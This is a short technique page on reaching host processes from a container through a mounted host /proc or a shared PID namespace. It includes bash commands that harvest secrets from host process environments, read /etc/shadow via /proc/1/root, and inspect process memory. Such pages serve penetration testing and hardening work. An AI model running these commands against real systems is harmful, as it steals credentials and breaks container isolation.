---
title: "Host process access: reaching host processes through mounted /proc"
description: "Using a host /proc mounted into a container, or a shared host PID namespace, to read host processes through /proc/<pid>: their environment and memory for secrets, and /proc/<pid>/root to reach the host filesystem and pivot."
keywords:
  - /proc/pid
  - host process access
  - procfs escape
  - environ secrets
  - container escape
---

# Host process access

With the host's `/proc` mounted in (or a shared host PID namespace), the container can inspect host processes through `/proc/<pid>`. That exposes process environments and memory, which routinely hold tokens and passwords, and `/proc/<pid>/root`, which is a doorway into the host filesystem through any host process.

```bash
# Secrets from host process environments
for p in /proc/[0-9]*; do tr '\0' '\n' < "$p/environ" 2>/dev/null; done | sort -u | grep -iE 'token|secret|key|pass'

# The host root filesystem via init's root link
ls -la /proc/1/root/
cat /proc/1/root/etc/shadow 2>/dev/null

# Live memory of a host process (with ptrace rights or shared PID namespace)
cat /proc/<pid>/maps
```

## Exploitation notes

- `/proc/1/root` resolves to the host root filesystem, so a mounted host `/proc` doubles as a [host path mount](../host-path-mount.md) even when no filesystem was bind-mounted.
- Reading another process's memory directly needs `CAP_SYS_PTRACE` or a shared PID namespace; see [Host PID namespace](../../shared-host-namespaces/host-pid-namespace.md).
- Environment and command-line reads need only the host `/proc` and matching UID or user-namespace mapping.

## References

- [man 5 proc](https://man7.org/linux/man-pages/man5/proc.5.html)
- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
